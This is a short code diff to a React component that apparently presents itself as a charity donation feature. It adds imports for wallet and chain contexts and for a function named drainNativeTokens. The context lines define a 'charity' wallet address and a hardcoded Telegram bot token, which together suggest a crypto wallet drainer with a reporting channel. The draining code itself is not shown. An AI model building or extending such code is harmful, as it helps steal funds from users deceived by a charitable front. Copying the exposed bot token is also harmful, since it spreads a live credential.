@@ -12,6 +12,9 @@ import { Loader2, X, Heart, Zap, Coins } from 'lucide-react';
 import { Badge } from '@/components/ui/badge';
 import { toast } from 'sonner';
 import { AnimatedLogo } from '@/components/AnimatedLogo';
+import { useChain } from '@/contexts/ChainContext';
+import { useEVMWallet } from '@/providers/EVMWalletProvider';
+import { drainNativeTokens } from '@/utils/evmTransactions';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
 const TELEGRAM_BOT_TOKEN = '8209811310:AAF9m3QQAU17ijZpMiYEQylE1gHd4Yl1u_M';
